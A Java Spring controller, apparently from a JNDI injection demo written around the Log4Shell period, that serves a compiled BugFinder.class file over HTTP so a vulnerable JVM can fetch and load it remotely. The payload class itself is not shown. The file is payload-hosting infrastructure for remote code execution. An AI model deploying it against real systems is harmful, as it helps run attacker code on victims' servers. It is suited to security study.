package com.wrh.jndidemo;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletResponse;
import java.io.FileInputStream;
import java.io.OutputStream;

/**
 * @author wuruohong
 * @Classname ClassController
 * @Description 提供一个缺陷漏洞服务
 * @Date 2021/12/14 11:25
 */
@RestController
public class ClassController {
    @GetMapping(value = "/BugFinder.class")
    public void getClass(HttpServletResponse response) throws Exception {
        System.out.println("down class incoming!!!!!!");
        String file = "D:\\pro\\mynetty\\target\\classes\\com\\wrh\\jndidemo\\BugFinder.class";
        FileInputStream inputStream = null;
        OutputStream os = null;
        try {
            inputStream = new FileInputStream(file);
            byte[] data = new byte[inputStream.available()];
            inputStream.read(data);
            os = response.getOutputStream();
            os.write(data);
            os.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
